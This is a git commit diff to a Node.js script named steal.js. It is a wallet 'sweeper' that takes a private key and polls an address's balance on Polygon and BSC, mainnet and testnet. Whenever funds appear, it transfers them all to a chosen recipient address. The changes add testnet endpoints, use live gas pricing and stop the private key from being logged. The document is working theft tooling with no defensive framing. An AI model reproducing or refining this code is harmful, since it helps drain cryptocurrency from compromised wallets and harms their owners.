d668fa26cf4535dbc3ff178e0d0dc79f42e66d60
Victor Shi <victor.shi@techcore.holdings>
2022-04-11 15:31:43 +0300

    1

--- steal.js
+++ steal.js
@@ -8,13 +8,14 @@ let to = String(process.argv[4]);
 let chain = String(process.argv[5]);
 
 let chains = {
-  'polygon': 'https://polygon-rpc.com',
-  'bsc': 'https://bsc-dataseed.binance.org/',
+    'polygon': 'https://polygon-rpc.com',
+    'polygon-test': 'https://rpc-mumbai.maticvigil.com/',
+    'bsc': 'https://bsc-dataseed.binance.org/',
+    'bsc-test': 'https://data-seed-prebsc-1-s1.binance.org:8545/',
 };
 
 console.log(
     {
-        pk: pk,
         from: from,
         to: to,
     }
@@ -27,15 +28,14 @@ if (!chains.hasOwnProperty(chain)) {
 }
 
 const provider = new Web3.providers.HttpProvider(chains[chain]);
-// const provider = new Web3.providers.HttpProvider('https://data-seed-prebsc-1-s1.binance.org:8545/');//test
 const web3 = new Web3(provider);
 
 function loop() {
     setTimeout(function() {
         web3.eth.getBalance(from).then(async (balance) => {
             if (balance > 0) {
-                console.log('Start...');
-                await sendToMe(from, balance, 21000, 10000000000);
+                console.log(`Start transfer... ${balance}`);
+                await sendToMe(from, balance, 21000, await web3.eth.getGasPrice());
                 console.log('Finish...');
             }
 
@@ -49,26 +49,21 @@ loop();
 async function sendToMe(from, balance, gas, gasPrice) {
     let count = await web3.eth.getTransactionCount(from);
 
-    console.log(from, count);
-
     let data = {
         to: to,
         from: from,
         value: web3.utils.toHex(balance-gasPrice*gas),
         gas: parseInt(gas),
         gasPrice: gasPrice,
-        gasLimit: parseInt(gas),
         nonce: web3.utils.toHex(count)
     };
 
-    console.log(data);
     console.log({
         to: to,
         from: from,
         value: balance-gasPrice*gas,
         gas: parseInt(gas),
         gasPrice: gasPrice,
-        gasLimit: parseInt(gas),
         nonce: count
     });
 
